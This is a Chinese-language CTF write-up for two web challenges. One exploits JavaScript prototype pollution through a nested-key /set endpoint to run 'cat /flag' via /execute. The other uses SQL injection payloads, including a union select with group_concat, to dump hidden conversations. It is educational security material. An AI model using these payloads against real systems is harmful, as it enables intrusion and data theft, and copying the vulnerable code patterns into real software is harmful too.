## [Web] Node.js is Web Scale

一个典型的 JavaScript 原型链污染漏洞。

预定义命令 `cmds`，`getsource` 用于显示源码，`test` 用于测试：

```javascript
let cmds = {
    getsource: "cat server.js",
    test: "echo 'hello, world!'",
};
```

使用对象实现键值存储：

```javascript
let store = {};
```

提供了四个 API：

- `GET /api/store`: 返回整个存储内容
- `POST /set`: 设置键值对，支持 `a.b.c` 格式嵌套的 key
- `GET /get`: 获取指定 key 的 value
- `GET /execute`: 执行预定义命令

重点关注 `/set` 里的代码处理逻辑：

```javascript
app.post("/set", (req, res) => {
    const {
        key,
        value
    } = req.body; // 从请求体获取 key 和 value

    const keys = key.split("."); // 将 key 按照 . 分割，支持多级属性
    let current = store;

    for (let i = 0; i < keys.length - 1; i++) {
        const key = keys[i];
        if (!current[key]) {
            current[key] = {}; // 如果中间节点不存在，创建空对象
        }
        current = current[key]; // 移动到下一层
    }

    current[keys[keys.length - 1]] = value; // 在最后一个 key 处设置 value

    res.json({
        message: "OK"
    });
});
```

当传入 `key=__proto__.newkey` 时：

- `current` 初始指向 `store`，一个空对象
- `current[__proto__]` 会访问对象的原型链上的 `Object.prototype` 对象
- `current[__proto__][newkey] = value` 会修改 Object.prototype，从而污染所有继承自该原型的对象

所以传入以下 Payload 时：

```http
POST /set HTTP/1.1
{
    "key": "__proto__.newcmd",
    "value": "cat /flag"
}
```

这会使 `newcmd` 属性被添加到 `Object.prototype` 上，因此所有以 `Object.prototype` 为原型的对象（包括 `cmds` 对象）都能通过原型链访问到这个属性。

于是可以通过 `/execute?cmd=newcmd` 来执行命令 `cat /flag`：

```http
GET /execute?cmd=newcmd HTTP/1.1
```

## [Web] PaoluGPT

`/view` 里将 GET 参数 `conversation_id` 直接拼入 SQL 语句，造成 SQL 注入：

```python
@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(
        f"select title, contents from messages where id = '{conversation_id}'"
    )
    return render_template("view.html", message=Message(None, results[0], results[1]))
```

需要注意的是，`execute_query` 函数默认只获取一条记录：

```python
def execute_query(s: str, fetch_all: bool = False):
    conn = sqlite3.connect("file:/tmp/data.db?mode=ro", uri=True)
    cur = conn.cursor()
    res = cur.execute(s)
    if fetch_all:
        return res.fetchall()
    else:
        return res.fetchone()
```

题目作者希望先用爬虫脚本解决第一题「千里挑一」，然后使用 SQL 注入解决第二题「窥视未知」。但如果只用 SQL 注入，应该会更容易解决「窥视未知」，然后才是「千里挑一」。

这是我比赛时的做题顺序，接下来也按照这个顺序，只用 SQL 注入。

### 窥视未知

在 `/list` 中，SQL 查询限制了只显示 `shown = true` 的对话：

```python
results = execute_query(
    "select id, title from messages where shown = true", fetch_all=True
)
```

但在 `/view` 中存在 SQL 注入漏洞，我们可以构造 Payload 绕过这个限制：

```
' or shown = false --
```

这个 Payload 会使 SQL 语句变为：

```sql
select title, contents from messages where id = '' or shown = false --'
```

这样查询条件就从匹配特定 ID 变成了获取所有 `shown = false` 的对话。

由于 `execute_query()` 默认只返回一条记录，所以这个方法仅在隐藏对话只有一篇时有效。

经过测试，数据库中确实只有一篇隐藏对话，其内容底部包含 Flag。

如果数据库中有多篇隐藏对话，那么可以使用 `like` 语句匹配包含 `flag` 的结果：

```
' or shown = false and contents like '%flag%'' --
```

### 千里挑一

构造以下 Payload：

```
' union select 1, group_concat(title, contents) from messages --
```

这个 Payload 会使 SQL 语句变为：

```sql
select title, contents from messages where id = '' 
union
select 1, group_concat(title, contents) from messages --'
```

- 第一个 `select` 由于 id 为空字符串，不会返回任何结果
- `union` 连接了第二个 `select`，它会返回所有对话的内容
- 使用 `group_concat()` 将所有记录合并成一行，这样就能绕过 `execute_query()` 只返回一条记录的限制
- 添加了第一列 `1` 是为了满足 `union` 两边列数相同的要求

执行后会获得数据库中所有对话的标题和内容，在返回的页面中搜索 `flag` 就能同时找到两题的 Flag。

## Other...

todo!()
